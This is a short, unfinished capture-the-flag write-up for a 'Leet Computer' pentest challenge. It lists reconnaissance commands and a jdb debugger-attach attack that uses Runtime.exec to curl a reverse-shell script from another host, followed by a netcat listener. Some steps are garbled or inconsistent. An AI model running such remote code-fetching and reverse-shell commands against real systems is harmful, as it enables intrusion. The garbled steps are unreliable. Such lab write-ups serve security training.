# Leet Computer: Pentest 19

### One of the attacker is still in the airport hall, and it seems that he is still connected to the airport wifi ! Get a root shell on its machine to continue your investigation. This challenge will give you access to another network.

My thought process...

1. ```nmap -Pn 10.40.3.230``` This is the ip that pinged us on the Discovery challenge.
   ```port 22 open ssh```
   ```port 8100 open http```
2. ```whatweb 10.40.3.230/8100``` Running Apache & PHP
3. ```telnet 10.40.3.230 8100``` Allows connection
4. *Install jdb*
5. ```jdb attach 10.40.3.230:8100```
6. ```stop in org.apache.logging.log4j.core.config.ConfigurationFileWatcher.isModified```
7. ```print new java.lang.Runtime().exec("sh -c $@|sh . curl 172.16.72.203:8888/reverse.py  -o /tmp/reverse.py")```
8. *Setup Netcat listener*
   ```nc -l 10.40.3.230```
9. ```print new java.lang.Runtime().exec("python3 /tmp/reverse.py")```
10. ```...```


**NOTE:** I did not finish this challenge before the competition ended. However, one of my teammates was able to solve before the competition ended.

Here is a write-up for this challenge by Łukasz Szymański: [Leet Computer](https://szymanski.ninja/en/ctfwriteups/2021/norzhctf2021/leet-computer/)

Another great write-up to check out by [@snix0](https://github.com/snix0) [https://github.com/snix0/norzhctf-writeup/blob/main/leet_computer/leet_computer.md](https://github.com/snix0/norzhctf-writeup/blob/main/leet_computer/leet_computer.md)

Oop found another write-up I liked by [stackotter.dev](https://stackotter.dev/): [https://stackotter.dev/blog/norzh-ctf-2021-leet-computer-writeup](https://stackotter.dev/blog/norzh-ctf-2021-leet-computer-writeup)
